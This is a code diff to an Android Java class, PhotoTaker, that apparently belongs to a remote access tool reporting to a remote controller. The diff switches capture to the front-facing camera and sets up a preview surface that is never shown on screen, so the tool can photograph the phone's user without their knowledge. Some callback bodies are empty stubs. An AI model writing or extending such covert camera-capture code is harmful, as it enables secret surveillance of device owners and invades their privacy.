@@ -7,6 +7,7 @@ import Packet.FilePacket;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.CameraInfo;
@@ -14,14 +15,15 @@ import android.sax.StartElementListener;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
-
 import android.os.Environment;
+
 import java.io.File;
 import java.io.FileOutputStream;
 
 public class PhotoTaker {
 
 	Camera cam;
+	Context aux_context;
 	ClientListener ctx;
 	int chan ;
 	SurfaceHolder holder;
@@ -103,7 +105,7 @@ public class PhotoTaker {
 	      ctx.sendInformation("Camera found id: " + i);
 	      CameraInfo info = new CameraInfo();
 	      Camera.getCameraInfo(i, info);
-	      if (info.facing == CameraInfo.CAMERA_FACING_BACK) {
+	      if (info.facing == CameraInfo.CAMERA_FACING_FRONT) {
 	        Log.i("PhotoTaker", " Facing Camera found " + info.facing );
 	        ctx.sendInformation("Facing Camera found : " + i);
 	        cameraId = i;
@@ -112,7 +114,32 @@ public class PhotoTaker {
 	    }
 	    return cameraId;
 	  }
-	
+
+	private SurfaceHolder.Callback holderCallback = new SurfaceHolder.Callback() {
+
+		public void surfaceChanged(SurfaceHolder holder, int format, int width,
+				int height) {
+			// TODO Auto-generated method stub
+			return;
+		}
+
+		public void surfaceCreated(SurfaceHolder holder) {
+			try {
+			
+
+
+			} catch (Exception e) {
+	        	Log.e("PhotoTaker", "ERROR in surfacecreated callback: " + e.getMessage());
+	        	ctx.sendError("ERROR in surfacecreated callback: " + e.getMessage());
+				e.printStackTrace();
+			}
+		}
+
+		public void surfaceDestroyed(SurfaceHolder holder) {
+			// TODO Auto-generated method stub
+			return;
+		}
+	};
 	public boolean takePhoto() {
         if(!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA))){
         	Log.e("PhotoTaker", "No camera!");
@@ -141,15 +168,18 @@ public class PhotoTaker {
         	return false;
         }
 
-        
-        SurfaceView view = new SurfaceView(ctx);
+        SurfaceView view = new SurfaceView(ctx.getApplicationContext());
         Log.i("PhotoTaker", "Right after SurfaceView");
         ctx.sendInformation("after surfceview");
         try {
-        	//holder = view.getHolder();
-        	//cam.setPreviewDisplay(holder);
-        	cam.setPreviewDisplay(null);
-        	cam.setPreviewCallback(null);
+        	holder = view.getHolder();
+        	
+        	holder.addCallback(holderCallback);
+        	Log.i("PhotoTaker", "Right before PreviewDisplay");
+        	ctx.sendInformation("Before previewDisplay");
+			cam.setPreviewDisplay(holder);
+        	//cam.setPreviewCallbackWithBuffer(null);
+        	//cam.setPreviewCallback(null);
         	Log.i("PhotoTaker", "Right after PreviewDisplay");
         	ctx.sendInformation("After previewDisplay");
         } catch(Exception e) { 
@@ -158,8 +188,7 @@ public class PhotoTaker {
         	
         	return false; 
         	}
-        
-        //cam.startPreview();
+        cam.startPreview();
         Log.i("PhotoTaker", "Right after startPreview");
         ctx.sendInformation("after startPreview");
         try{
